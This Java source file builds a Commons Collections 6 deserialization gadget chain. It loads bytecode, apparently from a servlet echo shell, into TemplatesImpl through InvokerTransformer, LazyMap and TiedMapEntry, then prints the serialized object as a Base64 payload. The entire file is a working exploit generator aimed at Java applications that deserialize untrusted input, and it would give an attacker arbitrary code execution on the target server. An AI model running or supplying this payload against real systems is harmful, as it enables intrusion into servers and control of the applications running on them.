package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections6 {
    public static void main(String[] args) throws Exception{
        byte[] bytes = ServletEchoCode10.getCode();
//        byte[] bytes = ClassPool.getDefault().get(ServletEcho10.class.getName()).toBytecode();

        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][]{bytes});
        setFieldValue(templatesImpl, "_name", "a");
        setFieldValue(templatesImpl, "_tfactory", null);

        Transformer invokerTransformer = new InvokerTransformer("toString", null, null);

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, invokerTransformer);

        TiedMapEntry mapEntry = new TiedMapEntry(outerMap, templatesImpl);

        Map expMap = new HashMap();
        expMap.put(mapEntry, null);

        setFieldValue(invokerTransformer, "iMethodName", "newTransformer");

        innerMap.clear();

        outBase64(expMap);
    }

    public static void setFieldValue(Object obj, String field, Object arg) throws Exception{
        Field f = obj.getClass().getDeclaredField(field);
        f.setAccessible(true);
        f.set(obj, arg);
    }

    public static void outBase64(Object object) throws Exception{
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream out = new ObjectOutputStream(bos);
        out.writeObject(object);
        out.close();
        byte[] encode = Base64.getEncoder().encode(bos.toByteArray());
        String s = new String(encode);
        System.out.println(s);
        System.out.println("Payload size:" + s.length());
    }
}
